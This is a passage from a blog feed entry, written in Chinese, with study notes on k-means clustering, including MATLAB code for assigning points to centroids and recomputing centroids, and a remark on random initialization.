class="hljs-built_in">size</span>(centroids, <span class="hljs-number">1</span>)<br>        a(<span class="hljs-built_in">j</span>, :) = X(<span class="hljs-built_in">i</span>, :);<br>    <span class="hljs-keyword">end</span><br>    distance = sum((a - centroids).^<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>    [~, idx(<span class="hljs-built_in">i</span>)] = <span class="hljs-built_in">min</span>(distance);<br><span class="hljs-keyword">end</span><br><br><span class="hljs-comment">% =============================================================</span><br><span class="hljs-keyword">end</span><br><br><br></code></pre></td></tr></table></figure><h3 id="优化目标-2"><a href="#优化目标-2" class="headerlink" title="优化目标(2)"></a>优化目标(2)</h3><img src="/2021/04/23/Cluster-notes/image-20210423164317870.png" class="" title="image-20210423164317870"><p>优化目标(2) 的作用是优化聚类中心。 $\mu_k$ 表示聚类中心，$C_k$ 是一个集合，用来记录聚类中心 k 对应的关联数据的集合，$|C_k|$ 是集合中元素的个数。</p><p>优化目标(2) 的代码实现</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">centroids</span> = <span class="hljs-title">computeCentroids</span><span class="hljs-params">(X, idx, K)</span></span><br><span class="hljs-comment">%COMPUTECENTROIDS returns the new centroids by computing the means of the </span><br><span class="hljs-comment">%data points assigned to each centroid.</span><br><span class="hljs-comment">%   centroids = COMPUTECENTROIDS(X, idx, K) returns the new centroids by </span><br><span class="hljs-comment">%   computing the means of the data points assigned to each centroid. It is</span><br><span class="hljs-comment">%   given a dataset X where each row is a single data point, a vector</span><br><span class="hljs-comment">%   idx of centroid assignments (i.e. each entry in range [1..K]) for each</span><br><span class="hljs-comment">%   example, and K, the number of centroids. You should return a matrix</span><br><span class="hljs-comment">%   centroids, where each row of centroids is the mean of the data points</span><br><span class="hljs-comment">%   assigned to it.</span><br><span class="hljs-comment">%</span><br><br><span class="hljs-comment">% Useful variables</span><br>[m n] = <span class="hljs-built_in">size</span>(X);<br><br><span class="hljs-comment">% You need to return the following variables correctly.</span><br>centroids = <span class="hljs-built_in">zeros</span>(K, n);<br><br>sums = <span class="hljs-built_in">zeros</span>(K, n);<br>sums_counter = <span class="hljs-built_in">zeros</span>(<span class="hljs-built_in">size</span>(idx, <span class="hljs-number">1</span>), <span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">j</span> = <span class="hljs-number">1</span> : <span class="hljs-built_in">size</span>(idx, <span class="hljs-number">1</span>)<br>    sums(idx(<span class="hljs-built_in">j</span>), :) = sums(idx(<span class="hljs-built_in">j</span>), :) + X(<span class="hljs-built_in">j</span>, :);<br>    sums_counter(idx(<span class="hljs-built_in">j</span>)) = sums_counter(idx(<span class="hljs-built_in">j</span>)) + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span><br><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">i</span> = <span class="hljs-number">1</span> : <span class="hljs-built_in">size</span>(sums, <span class="hljs-number">1</span>)<br>    sums(<span class="hljs-built_in">i</span>, :) = sums(<span class="hljs-built_in">i</span>, :) ./ sums_counter(<span class="hljs-built_in">i</span>);<br><span class="hljs-keyword">end</span><br><br>centroids = sums;<br><br><span class="hljs-comment">% =============================================================</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h3 id="随机初始化聚类中心"><a href="#随机初始化聚类中心" class="headerlink" title="随机初始化聚类中心"></a>随机初始化聚类中心</h3><p>k-means 结果对于初始的聚类中心选择非常敏感，在运行 k-means 算法之前，我们应该选择随机的聚类中心。一般随机选择 k 个数据点作为聚类中心。多次用随机初始化的聚类中心运行 k-means 算法，选择误差最小的为最优模型。这样可以避免迭代算法达到局部最优解。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;聚类&quot;&gt;&lt;a href=&quot;#聚类&quot; class=&quot;headerlink&quot; title=&quot;聚类&quot;&gt;&lt;/a&gt;聚类&lt;/h1&gt;&lt;p&gt;简单记录一下聚类。&lt;/p&gt;
&lt;p&gt;无监督学习：训练集没有标签，聚类就是一个典型的无监督学习应用。&lt;/p&gt;
&lt;img src=&quot;/2021/0</summary>
      
    
    
    
    <category term="ml" scheme="https://panda0s.top/categories/ml/"/>
    
    
    <category term="notes" scheme="https://panda0s.top/tags/notes/"/>
    
    <category term="homework" scheme="https://panda0s.top/tags/homework/"/>
    
  </entry>
  
</feed>
